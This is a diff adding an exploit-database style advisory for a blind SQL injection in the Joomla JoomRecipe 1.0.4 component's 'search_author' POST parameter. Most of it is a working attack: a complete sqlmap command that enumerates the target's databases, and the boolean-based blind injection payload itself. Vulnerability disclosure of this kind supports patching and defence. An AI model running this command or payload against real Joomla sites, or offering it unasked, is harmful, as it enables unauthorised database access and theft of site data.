@@ -1,0 +1,18 @@
+# Exploit Title: Joomla JoomRecipe 1.0.4 Component - Blind SQL Injection Vulnerability
+# Date: 20.07.2017
+# Exploit Author: Teng
+# Vendor Homepage: http://joomboost.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/vertical-markets/food-a-beverage/joomrecipe/
+# Version: 1.0.4
+# Platform: PHP
+
+1. Description
+Blind SQL Injection on Search page, with "search_author" parameter (POST)
+
+2. Proof of concept
+sqlmap.py -u "http://localhost/[PATH]/search/results.html" -p search_author --data "searchPerformed=1&task=search&searchword=asd&searchCategories%5B%5D=*&search_cuisine=&searchSeasons=&search_author=1&search_max_prep_hours=2&search_max_prep_minutes=0&search_max_cook_hours=2&search_max_cook_minutes=0&search_min_rate=0&search_max_cost=999&currentIngredient=" --random-agent --dbs
+
+Parameter: search_author (POST)
+    Type: boolean-based blind
+    Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+    Payload: searchPerformed=1&task=search&searchword=asd&searchCategories[]=*&search_cuisine=&searchSeasons=&search_author=(SELECT (CASE WHEN (8160=8160) THEN 8160 ELSE 8160*(SELECT 8160 FROM INFORMATION_SCHEMA.PLUGINS) END))&search_max_prep_hours=2&search_max_prep_minutes=0&search_max_cook_hours=2&search_max_cook_minutes=0&search_min_rate=0&search_max_cost=999&currentIngredient=
